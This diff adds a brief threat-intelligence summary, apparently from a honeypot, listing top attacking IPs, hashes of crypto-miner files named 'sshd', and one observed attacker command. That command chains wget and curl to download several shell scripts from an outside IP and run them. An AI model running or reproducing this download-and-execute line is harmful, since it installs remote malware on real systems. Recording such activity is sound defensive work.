@@ -1,0 +1,17 @@
+Top 5 IPs for 2023-11-14:
+
+103.180.148.23
+218.200.189.88
+112.118.185.5
+1.116.157.153
+107.184.198.87
+
+Top malware downloads:
+File name: sshd
+File Hash: 6909e1284e37c8f4b75e9bd7cdaca935adf5469c75c37c4a21fc68713bbe0ffc and e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
+
+Both crypto miners.
+
+Malicious commands seen:
+
+cd /data/local/tmp/;busybox wget http://103.178.229.177/w.sh; sh w.sh; curl http://103.178.229.177/c.sh; sh c.sh; wget http://103.178.229.177/wget.sh; sh wget.sh; curl http://103.178.229.177/wget.sh; sh wget.sh; busybox wget http://103.178.229.177/wget.sh; sh wget.sh; busybox curl http://103.178.229.177/wget.sh; sh wget.sh
